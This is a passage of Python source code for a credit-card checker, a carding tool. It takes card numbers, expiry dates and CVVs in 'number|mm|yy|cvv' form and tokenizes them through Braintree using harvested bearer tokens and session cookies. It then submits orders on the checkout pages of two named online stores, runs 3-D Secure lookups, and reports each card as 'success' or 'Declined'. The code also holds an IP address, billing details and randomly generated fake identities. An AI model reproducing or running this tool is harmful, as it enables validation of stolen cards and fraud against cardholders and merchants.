		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': '12',
		                'expirationYear': '2029',
		                'cvv': '982',
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		try:
			tok = response.json()['data']['tokenizeCreditCard']['token']
		except:
			get_ref()
		headers = {
		    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.sportfish.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.sportfish.co.uk/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
		json_data = {
		    'amount': '302.50',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar',
    'browserScreenHeight': 1080,
    'browserScreenWidth': 1920,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': '197.63.41.253',
        'billingLine1': '10080 Okeechobee Blvd',
        'billingLine2': '',
        'billingCity': 'West Palm Beach',
        'billingState': '',
        'billingPostalCode': '33411-1482',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '(919) 515-7628',
        'billingGivenName': '\\u0043\\u0068\\u0072\\u0069\\u0073\\u0074\\u0061',
        'billingSurname': '\\u0061\\u0066\\u0061\\u0064\\u0066',
    },
    'challengeRequested': True,
    'bin': '440393',
    'dfReferenceId': ref,
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.94.0',
        'cardinalDeviceDataCollectionTimeElapsed': 273,
        'issuerDeviceDataCollectionTimeElapsed': 387,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.94.0',
    '_meta': {
        'merchantAppId': 'www.sportfish.co.uk',
        'platform': 'web',
        'sdkVersion': '3.94.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '4dca19f1-754d-4e79-a20f-b0dd2d6dbf58',
    },
}
		response = requests.post(
		    f'https://api.braintreegateway.com/merchants/fs8wxy78pkvx72rh/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		try:
			string=response.json()['paymentMethod']['threeDSecureInfo']['status']
		except:
			return 'Error'
		formatted_string = string.replace("_", " ").title()
		otp=(formatted_string)
		if 'Successful' in otp or 'Unavailable' in  otp or 'successful' in otp:
			return otp+' ✅'
		else:
			return otp+' ❌'
	return result(cc)

def br(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests,re,base64
	name = ''.join(random.choices(string.ascii_lowercase, k=20))
	number = ''.join(random.choices(string.digits, k=4))
	em=f"{name}{number}@gmail.com"
	name = ''.join(random.choices(string.ascii_lowercase, k=10))
	number = ''.join(random.choices(string.digits, k=2))
	bill=f"{number}{name}"
	namek = ''.join(random.choices(string.ascii_lowercase, k=6))
	first = namek
	last = name
	numbers_and_zips = {
        3606: "10080",
        3558: "10071",
        3534: "10012",
        3577: "10011",
        3573: "10044",
        3607: "70012",
        3568: "33321"
    }
	number = random.choice(list(numbers_and_zips.keys()))
	zip_code = numbers_and_zips[number]
	letters_and_digits = string.ascii_letters + string.digits
	number = ''.join(random.choices(string.digits, k=7))
	user = user_agent.generate_user_agent()
	def up():
		r = requests.session()
		headers={
		'User-Agent': user
		}
		response = r.get('https://www.paintsupply.com', headers=headers)
		from requests_toolbelt.multipart.encoder import MultipartEncoder
		headers = {
		    'User-Agent': user,
		}
		
		files = {
    'quantity': (None, '1'),
    'product_price': (None, '0.85'),
    'product_weight': (None, '0.040'),
    'sfm_logic_onoff': (None, 'off'),
    'modal_hide_show': (None, 'hide'),
    'sfm_value': (None, '4100'),
    'sfm_type': (None, 'dollars'),
    'cart_old_qty': (None, '0.85'),
    'check_sfm_on_off_for_modal': (None, '0'),
    'add-to-cart': (None, '28022'),
    'gtm4wp_id': (None, '28022'),
    'gtm4wp_internal_id': (None, '28022'),
    'gtm4wp_name': (None, 'Trimaco 11101 Supertuff Cone Strainer, Fine Mesh 4-Pack'),
    'gtm4wp_sku': (None, '153512'),
    'gtm4wp_category': (None, 'Paint Strainers'),
    'gtm4wp_price': (None, '0.85'),
    'gtm4wp_stocklevel': (None, '104'),
    'gtm4wp_brand': (None, 'Trimaco'),
}
		multipart_data = MultipartEncoder(files)
		headers['Content-Type'] = multipart_data.content_type
		response = r.post(
		    'https://www.paintsupply.com/product/painting-equipment-supplies-one/paint-strainers/4-pk-trimaco-11101-supertuff-cone-strainer-fine-mesh-4-pack/',
		    cookies=r.cookies,
		    headers=headers,
		    data=multipart_data
		)
		response = r.get('https://www.paintsupply.com/cart/', cookies=r.cookies, headers=headers)
		response = r.get('https://www.paintsupply.com/checkout', cookies=r.cookies, headers=headers)
		print(response.text)
		nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]

		from bs4 import BeautifulSoup
		soup = BeautifulSoup(response.text, 'html.parser')
		wpnonce_input = soup.find('input', id='_wpnonce')
		wpnonce_value = wpnonce_input['value']
		headers = {
    'Accept': '*/*',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'pbid=35321fb103b2526eb223c91b425ddfffbff4e762e162a2cfe72e89402ec60346; AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; pys_session_limit=true; pys_start_session=true; nf23510_services_exp=066-950-630; __mmapiwsid=019170fb-ac4d-7baa-a04a-397d9fcf845c:1662824deeca636046c2b73a9301b21847ae5ac9; wp-wpml_current_language=en; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.paintsupply.com/; last_pysTrafficSource=direct; last_pys_landing_page=https://www.paintsupply.com/; _fbp=fb.1.1724177430305.1743349866; _gcl_au=1.1.1425670041.1724177432; BVBRANDID=05aa8951-98bd-4fb8-9230-39128ac8c1ec; BVBRANDSID=9953060c-a3c4-461f-a49c-8e22ed14a58a; _gid=GA1.2.639163171.1724177439; _fbp=fb.1.1724177430305.1743349866; __qca=P0-2022151556-1724177436875; PHPSESSID=e37eima89mtftu1rt3tbe4rjv1; shoppingfeeder=91876284c1d7c746; woocommerce_items_in_cart=1; wp_woocommerce_session_8799450e5122eb37f5ddc09d45cc175b=t_c8546d1e2bc4a38dc7d281875193ab%7C%7C1724350557%7C%7C1724346957%7C%7Ccf5ed8d4ef885fce53713b3902353cff; ctm_data=%5B%7B%22product_id%22%3A30241%2C%22manufacturer_id%22%3A8124%2C%22minimun_req_type%22%3Anull%2C%22minimum_req_value%22%3Anull%2C%22sfm_available%22%3Anull%7D%2C%7B%22product_id%22%3A28022%2C%22manufacturer_id%22%3A8174%2C%22minimun_req_type%22%3A%22dollars%22%2C%22minimum_req_value%22%3A%224100%22%2C%22sfm_available%22%3A%22yes%22%7D%5D; dicbo_id=%7B%22dicbo_fetch%22%3A1724178109011%7D; woocommerce_cart_hash=a26426d0e993175e71024a7caef3bc7f; _ga=GA1.2.114018348.1724177439; _ga_T78BEZZ2B5=GS1.1.1724177438.1.1.1724178248.16.0.0; __kla_id=eyJjaWQiOiJObUprWkRjeU16QXRaVFU0TlMwME4ySXhMVGd4T1RNdE5EaGhNV1poWmpBME0yUTUiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjQxNzc0MzgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnBhaW50c3VwcGx5LmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjQxNzgyNTYsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnBhaW50c3VwcGx5LmNvbS8ifX0=; _gat_UA-38888967-2=1; _ga_0YNMLT9GX6=GS1.1.1724177439.1.1.1724178257.51.0.0; _uetsid=803c7cf05f1f11efa070514e53af975d; _uetvid=803cc0b05f1f11ef9ac977e908e64918',
    'Origin': 'https://www.paintsupply.com',
    'Referer': 'https://www.paintsupply.com/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
		data = {
	    'action': 'wc_braintree_paypal_get_client_token',
	    'nonce': nonce,
	}
	
		response = requests.post('https://www.paintsupply.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		import pickle
		with open('cookies.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					'na' : {
		  "nonce": wpnonce_value,
		  "au": au
					}
				}
		
		existing_data.update(new_data)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	try:
		wpnonce_value=json_data['na']['nonce']
		au=json_data['na']['au']
		r = requests.session()
		import pickle
		import http.cookiejar
		with open('cookies.pkl', 'rb') as f:
			cookies = pickle.load(f)
		r = requests.session()
		r.cookies = cookies
	except Exception as e:
		up()
	headers = {
	'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQyNjU0OTEsImp0aSI6IjRkNGI5MzFjLTNkYzEtNGNlZi04NTI1LTc4NWYyY2ZiNGY5YyIsInN1YiI6ImhkYmNueW0yeXBwY3k3cjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImhkYmNueW0yeXBwY3k3cjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicGFpbnRzdXBwbHlfaW5zdGFudCJ9fQ.eN9AwfZzb2qciTwqagcruNEMCzC5q5C6cOr_wRIwV7zx8x_6ZrIs_UDUYP17DBL6BMkBFuCvmevwTS6iH9olYQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

	
	json_data = {
	     'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '1489cf00-cd1f-4140-bcb2-081207958c1e',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		up()
		return 'Declined'
	
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'pbid=35321fb103b2526eb223c91b425ddfffbff4e762e162a2cfe72e89402ec60346; AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; pys_session_limit=true; pys_start_session=true; nf23510_services_exp=066-950-630; __mmapiwsid=019170fb-ac4d-7baa-a04a-397d9fcf845c:1662824deeca636046c2b73a9301b21847ae5ac9; wp-wpml_current_language=en; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.paintsupply.com/; last_pysTrafficSource=direct; last_pys_landing_page=https://www.paintsupply.com/; _fbp=fb.1.1724177430305.1743349866; BVBRANDID=05aa8951-98bd-4fb8-9230-39128ac8c1ec; _gid=GA1.2.639163171.1724177439; _fbp=fb.1.1724177430305.1743349866; __qca=P0-2022151556-1724177436875; PHPSESSID=e37eima89mtftu1rt3tbe4rjv1; shoppingfeeder=91876284c1d7c746; ctm_data=%5B%7B%22product_id%22%3A30241%2C%22manufacturer_id%22%3A8124%2C%22minimun_req_type%22%3Anull%2C%22minimum_req_value%22%3Anull%2C%22sfm_available%22%3Anull%7D%2C%7B%22product_id%22%3A28022%2C%22manufacturer_id%22%3A8174%2C%22minimun_req_type%22%3A%22dollars%22%2C%22minimum_req_value%22%3A%224100%22%2C%22sfm_available%22%3A%22yes%22%7D%5D; __kla_id=eyJjaWQiOiJObUprWkRjeU16QXRaVFU0TlMwME4ySXhMVGd4T1RNdE5EaGhNV1poWmpBME0yUTUiLCIkcmVmZXJyZXIiOnsidHMiOjE3MjQxNzc0MzgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnBhaW50c3VwcGx5LmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MjQxNzg4ODYsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnBhaW50c3VwcGx5LmNvbS8ifSwiJHNvdXJjZSI6IkNoZWNrb3V0IFNNUyBPcHQtSW4iLCIkZXhjaGFuZ2VfaWQiOiJNMVpsT1BPUmhnaU1EbEc1dHV2R0pBbkE5V25lVXZsOFFxcGRzOFRacmgwLktFN3l6MiJ9; wordpress_logged_in_8799450e5122eb37f5ddc09d45cc175b=adfeaqfa%40gmail.com%7C1725388589%7CHUKPbvsybJyw00IWQpcTsfkyaQz54GlqzNxi0gNl9a5%7C5f4f14ed086ca753fe095dc2ce24ec636e188bb30e915d83e7968a8e17456d2d; wp_woocommerce_session_8799450e5122eb37f5ddc09d45cc175b=31222%7C%7C1724350557%7C%7C1724346957%7C%7C374e7250743b4b420d41fa5a95f3ce81; ctm_user_id=31222; ctm_user_id=31222; dicbo_id=%7B%22dicbo_fetch%22%3A1724179016899%7D; _ga=GA1.2.114018348.1724177439; _uetsid=803c7cf05f1f11efa070514e53af975d; _uetvid=803cc0b05f1f11ef9ac977e908e64918; _ga_T78BEZZ2B5=GS1.1.1724177438.1.1.1724179307.53.0.0; _ga_0YNMLT9GX6=GS1.1.1724177439.1.1.1724179307.53.0.0; _gcl_au=1.1.1425670041.1724177432.510401125.1724178888.1724179308',
    'Origin': 'https://www.paintsupply.com',
    'Referer': 'https://www.paintsupply.com/checkout/order-pay/599709/?pay_for_order=true&key=wc_order_3DXKeLn3TuDkp',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
	
	params = {
    'pay_for_order': 'true',
    'key': 'wc_order_3DXKeLn3TuDkp',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '11.81',
    'billing_first_name': 'Christa',
    'billing_last_name': 'afadf',
    'billing_phone': '09195157628',
    'billing_address_1': '1981 Jennifer Lane',
    'billing_address_2': '',
    'billing_postcode': '10080',
    'billing_email': 'adfeaqfa@gmail.com',
    'shipping_first_name': 'Christa',
    'shipping_last_name': 'afadf',
    'shipping_address_1': '1981 Jennifer Lane',
    'shipping_address_2': '',
    'shipping_city': 'Raleigh',
    'shipping_postcode': '10080',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'wc_braintree_paypal_device_data': '{"correlation_id":"e44d074071c3773e9f5f3205c48fe2db"}',
    'wc_braintree_paypal_payment_nonce': '',
    'wc_braintree_paypal_amount': '11.81',
    'wc_braintree_paypal_currency': 'USD',
    'wc_braintree_paypal_locale': 'en_us',
    'woocommerce_pay': '1',
    '_wpnonce': wpnonce_value,
    '_wp_http_referer': '/checkout/order-pay/599709/?pay_for_order=true&key=wc_order_3DXKeLn3TuDkp',
}
	
	response = r.post('https://www.paintsupply.com/checkout/order-pay/599709/', params=params, cookies=r.cookies, headers=headers, data=data)
	last=response.text
	if 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last:
		up()
		return 'success'
	elif 'Sorry, your session has expired.' in last:
		up()
		return 'Declined'
	try:
		m=(response.json()['messages'])
		m=m.split('class=\"woocommerce-error\">\n\t\t\t<li>')[1].split('</li>\n\t</ul>\n')[0]
		return m
	except:
		up()
		return 'Declined'
def brr(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQyNjMyMDQsImp0aSI6IjIwNDcxYzRhLTI0ZTAtNDg1MS1hY2Q5LTAzZTllMjk5YWE2MyIsInN1YiI6IjUycXI0OHR4bXpycnZzZHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjUycXI0OHR4bXpycnZzZHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.flYtovT_CFDg9pqK-xCO62ew6uIvG1caJe61yqgaen9gReCDUyIS0dNeZeNewP5o8kJ1HM6HoYdf2w0mB2XpJg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'caaefcf9-3372-4b8e-b0c5-a89406415d5a',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',

	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok =(response.json()['data']['tokenizeCreditCard']['token'])	
	cookies = {
    'OptiContacts': 'return',
    'mv_cache_source': 'return',
    '_ga': 'GA1.1.1526829891.1724176048',
    '_fbp': 'fb.1.1724176047936.819086963668991004',
    'MV_SESSION_ID': 'jZdFZYiRNqBJdIL7:197.63.41.253',
    '_pin_unauth': 'dWlkPU1EVTFObVJpT0RJdE5qRmhaaTAwWTJObUxXSXpZVGd0TkdNeFpqWmtaRFpsWkRZMQ',
    'unbxd.userId': 'uid-1724176054290-9740',
    'unbxd.visit': 'first_time',
    '_switch_session_id': 'c39c9410-adb3-49bc-9cb8-668248669435',
    '_cq_duid': '1.1724176055.cxHlJLFcQNUFSeZk',
    '_cq_suid': '1.1724176055.bNpbA4iIVIIhaDko',
    '_clck': '1u32u7u%7C2%7Cfoh%7C0%7C1693',
    '_tt_enable_cookie': '1',
    '_ttp': 'WA47ZPcdwHHgfFrzy3KYjPaKtmU',
    'unbxd.visitId': 'visitId-1724176099020-93554',
    'rxParamsGL': '%7B%22lastProduct%22%3A%7B%7D%2C%22rxType%22%3A%22distance%22%2C%22OD%22%3A%7B%22sph%22%3A%22-7.25%22%2C%22cyl%22%3A%22-0.25%22%2C%22axis%22%3A%225%22%2C%22add%22%3A%22%22%7D%2C%22OS%22%3A%7B%22sph%22%3A%22-0.25%22%2C%22cyl%22%3A%22-0.75%22%2C%22axis%22%3A%225%22%2C%22add%22%3A%22%22%7D%2C%22lens%22%3A%7B%22sku%22%3A%22%22%7D%2C%22coatings%22%3A%7B%7D%7D',
    'nitems': '1',
    'basket_cookie_chunks': '0',
    'litems': '1',
    '_ga_6V4LEK6WHW': 'GS1.1.1724176047.1.1.1724176802.58.0.0',
    'mp_ba7072da7c16aa18d6726bda9bc3a7ca_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A19170e6c24723b1-074b78f3ff437-26001e51-1fa400-19170e6c24723b2%22%2C%22%24device_id%22%3A%20%2219170e6c24723b1-074b78f3ff437-26001e51-1fa400-19170e6c24723b2%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.kits.com%2Ford%22%2C%22%24initial_referring_domain%22%3A%20%22www.kits.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.kits.com%2Ford%22%2C%22%24initial_referring_domain%22%3A%20%22www.kits.com%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D',
    '_uetsid': '455dc5905f1c11ef8f64bd86044a7932',
    '_uetvid': '455dfe205f1c11ef853a1d46f9004280',
    '_ga_8YQPSJBW5Y': 'GS1.1.1724176058.1.1.1724176804.0.0.0',
    '_clsk': 'z33ds5%7C1724176805111%7C1%7C1%7Cx.clarity.ms%2Fcollect',
    'basket_cookie': '%7b%22price1%22%3a%229%2e00%22%2c%22descrip1%22%3a%22London%20Fog%20LF%20403%22%2c%22lenses_descrip1%22%3a%22Standard%20Lenses%22%2c%22href1%22%3a%22https%3a%2f%2fwww%2ekits%2ecom%2fglasses%2fGL00275%2ehtml%3fconfig%3d000000625%22%2c%22src1%22%3a%22%2fcart%2fimages%2fframes%2fitems%2f1%2f11%2f11000000625_IMG_green%2epng%22%2c%22qty1%22%3a%221%22%2c%22subtot%22%3a%229%22%2c%22number_total_items%22%3a%221%22%2c%22totqty%22%3a%221%22%2c%22mv_locale%22%3a%22en_US%22%7d',
    '_gcl_au': '1.1.738839759.1724176047.2119908149.1724176847.1724176847',
    'userID': '6c28432c6919f625a62c0e854f5ec2cc04031ff3',
}
	
	headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    # 'cookie': 'OptiContacts=return; mv_cache_source=return; _ga=GA1.1.1526829891.1724176048; _fbp=fb.1.1724176047936.819086963668991004; MV_SESSION_ID=jZdFZYiRNqBJdIL7:197.63.41.253; _pin_unauth=dWlkPU1EVTFObVJpT0RJdE5qRmhaaTAwWTJObUxXSXpZVGd0TkdNeFpqWmtaRFpsWkRZMQ; unbxd.userId=uid-1724176054290-9740; unbxd.visit=first_time; _switch_session_id=c39c9410-adb3-49bc-9cb8-668248669435; _cq_duid=1.1724176055.cxHlJLFcQNUFSeZk; _cq_suid=1.1724176055.bNpbA4iIVIIhaDko; _clck=1u32u7u%7C2%7Cfoh%7C0%7C1693; _tt_enable_cookie=1; _ttp=WA47ZPcdwHHgfFrzy3KYjPaKtmU; unbxd.visitId=visitId-1724176099020-93554; rxParamsGL=%7B%22lastProduct%22%3A%7B%7D%2C%22rxType%22%3A%22distance%22%2C%22OD%22%3A%7B%22sph%22%3A%22-7.25%22%2C%22cyl%22%3A%22-0.25%22%2C%22axis%22%3A%225%22%2C%22add%22%3A%22%22%7D%2C%22OS%22%3A%7B%22sph%22%3A%22-0.25%22%2C%22cyl%22%3A%22-0.75%22%2C%22axis%22%3A%225%22%2C%22add%22%3A%22%22%7D%2C%22lens%22%3A%7B%22sku%22%3A%22%22%7D%2C%22coatings%22%3A%7B%7D%7D; nitems=1; basket_cookie_chunks=0; litems=1; _ga_6V4LEK6WHW=GS1.1.1724176047.1.1.1724176802.58.0.0; mp_ba7072da7c16aa18d6726bda9bc3a7ca_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A19170e6c24723b1-074b78f3ff437-26001e51-1fa400-19170e6c24723b2%22%2C%22%24device_id%22%3A%20%2219170e6c24723b1-074b78f3ff437-26001e51-1fa400-19170e6c24723b2%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.kits.com%2Ford%22%2C%22%24initial_referring_domain%22%3A%20%22www.kits.com%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.kits.com%2Ford%22%2C%22%24initial_referring_domain%22%3A%20%22www.kits.com%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _uetsid=455dc5905f1c11ef8f64bd86044a7932; _uetvid=455dfe205f1c11ef853a1d46f9004280; _ga_8YQPSJBW5Y=GS1.1.1724176058.1.1.1724176804.0.0.0; _clsk=z33ds5%7C1724176805111%7C1%7C1%7Cx.clarity.ms%2Fcollect; 